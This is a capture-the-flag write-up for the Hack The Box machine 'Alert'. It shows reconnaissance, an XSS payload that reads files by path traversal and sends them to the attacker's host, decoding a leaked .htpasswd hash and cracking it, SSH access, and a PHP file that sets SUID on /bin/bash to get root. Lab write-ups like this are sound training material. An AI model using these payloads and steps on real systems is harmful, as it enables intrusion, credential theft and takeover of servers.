---
layout: single
title: Alert - Hack The Box
excerpt: "Alert is an easy-difficulty Linux machine with a website to upload, view, and share markdown files. The site is vulnerable to cross-site scripting (XSS), which is exploited to access an internal page vulnerable to Arbitrary File Read and leveraged to gain access to a password hash. The hash is then cracked to reveal the credentials leveraged to gain 'SSH' access to the target. Enumeration of processes running on the system shows a 'PHP' file that is being executed regularly, which has excessive privileges for the management group our user is a member of and allows us to overwrite the file for code execution as root."
date: 2025-05-06
classes: wide
header:
  teaser: /img2/alert.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - XSS - Injection Via Markdown
  - Discovering LFI accessible from XSS
  - Cracking Hashes
  - Exploiting Web Service Executed by Root
  - Creating a Malicious php File in Writable Path [Privilege Escalation]
---


## Reconnaissance

- Nmap scan

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.11.44
```

![](/img2/Pasted%20image%2020250429200024.png)

- Add domain to local DNS

```bash
echo "10.10.11.44 alert.htb" >> /etc/hosts
```

- Whatweb

```bash
whatweb http://alert.htb/
```

![](/img2/Pasted%20image%2020250429200511.png)

## Exploitation

- Test XSS

![](/img2/Pasted%20image%2020250429203804.png)

![](/img2/Pasted%20image%2020250429203838.png)

- XSS -> LFI

![](/img2/Pasted%20image%2020250429221313.png)

> Since the administrator will be checking all the reports, we can try to redirect a URL.

![](/img2/Pasted%20image%2020250429221956.png)

```bash
python -m http.server 80
```

![](/img2/Pasted%20image%2020250429222055.png)

![](/img2/Pasted%20image%2020250429223407.png)

```javascript
fetch('http://alert.htb/messages.php?file=../../../../../../../../../../etc/hosts')
  .then(r => r.text())
  .then(t => fetch('http://10.10.16.4/?data=' + btoa(t)));
```

![](/img2/Pasted%20image%2020250429223522.png)

```bash
python -m http.server 80
```

![](/img2/Pasted%20image%2020250429223702.png)

```bash
echo "PHByZT4xMjcuMC4wLjEgbG9jYWxob3N0CjEyNy4wLjEuMSBhbGVydAoxMjcuMC4wLjEgYWxlcnQuaHRiCjEyNy4wLjAuMSBzdGF0aXN0aWNzLmFsZXJ0Lmh0YgoKIyBUaGUgZm9sbG93aW5nIGxpbmVzIGFyZSBkZXNpcmFibGUgZm9yIElQdjYgY2FwYWJsZSBob3N0cwo6OjEgICAgIGlwNi1sb2NhbGhvc3QgaXA2LWxvb3BiYWNrCmZlMDA6OjAgaXA2LWxvY2FsbmV0CmZmMDA6OjAgaXA2LW1jYXN0cHJlZml4CmZmMDI6OjEgaXA2LWFsbG5vZGVzCmZmMDI6OjIgaXA2LWFsbHJvdXRlcnMKPC9wcmU+Cg==" | base64 -d
```

![](/img2/Pasted%20image%2020250429223742.png)

> We can see the apache configuration in /etc/apache2/sites-available/000-default.conf

![](/img2/Pasted%20image%2020250429224230.png)

![](/img2/Pasted%20image%2020250429224329.png)

```bash
python3 -m http.server 80
```

![](/img2/Pasted%20image%2020250429224438.png)

```bash
echo "PHByZT48VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgYWxlcnQuaHRiCgogICAgRG9jdW1lbnRSb290IC92YXIvd3d3L2FsZXJ0Lmh0YgoKICAgIDxEaXJlY3RvcnkgL3Zhci93d3cvYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICBSZXdyaXRlRW5naW5lIE9uCiAgICBSZXdyaXRlQ29uZCAle0hUVFBfSE9TVH0gIV5hbGVydFwuaHRiJAogICAgUmV3cml0ZUNvbmQgJXtIVFRQX0hPU1R9ICFeJAogICAgUmV3cml0ZVJ1bGUgXi8/KC4qKSQgaHR0cDovL2FsZXJ0Lmh0Yi8kMSBbUj0zMDEsTF0KCiAgICBFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKICAgIEN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCjwvVmlydHVhbEhvc3Q+Cgo8VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICBEb2N1bWVudFJvb3QgL3Zhci93d3cvc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzCiAgICAgICAgQWxsb3dPdmVycmlkZSBBbGwKICAgICAgICBBdXRoVHlwZSBCYXNpYwogICAgICAgIEF1dGhOYW1lICJSZXN0cmljdGVkIEFyZWEiCiAgICAgICAgQXV0aFVzZXJGaWxlIC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiLy5odHBhc3N3ZAogICAgICAgIFJlcXVpcmUgdmFsaWQtdXNlcgogICAgPC9EaXJlY3Rvcnk+CgogICAgRXJyb3JMb2cgJHtBUEFDSEVfTE9HX0RJUn0vZXJyb3IubG9nCiAgICBDdXN0b21Mb2cgJHtBUEFDSEVfTE9HX0RJUn0vYWNjZXNzLmxvZyBjb21iaW5lZAo8L1ZpcnR1YWxIb3N0PgoKPC9wcmU+Cg==" | base64 -d
```

![](/img2/Pasted%20image%2020250429224657.png)

> Add new subdomain to local DNS

```bash
echo "10.10.11.44 statistics.alert.htb" >> /etc/hosts
```

![](/img2/Pasted%20image%2020250429225030.png)

> We can try to see the .httpasswd 

![](/img2/Pasted%20image%2020250429225832.png)

![](/img2/Pasted%20image%2020250429225939.png)

```bash
python3 -m http.server 80
```

![](/img2/Pasted%20image%2020250429230101.png)

```bash
echo "PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K" | base64 -d
```

![](/img2/Pasted%20image%2020250429230204.png)

- Crack the hash with hashcat

```bash
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt --user
```

![](/img2/Pasted%20image%2020250429230402.png)

- Conect SSH

```bash
ssh albert@10.10.11.44
```


## Post-exploitation

- Check user groups

```bash
id
```

![](/img2/Pasted%20image%2020250506202728.png)

- Find group writable files

```bash
find / -group management -writable 2>/dev/null
```

![](/img2/Pasted%20image%2020250506202838.png)

- Find system process that contain monitor word

```bash
ps -aux | grep monitor
```

![](/img2/Pasted%20image%2020250506203026.png)

> A web has running by root user

- Create malicious php file 

```bash
echo "<?php system('chmod u+s /bin/bash')?>" > test.php
```

```bash
curl 127.0.0.1:8080/config/test.php
```

```bash
bash -p
```

![](/img2/alertflag.png)
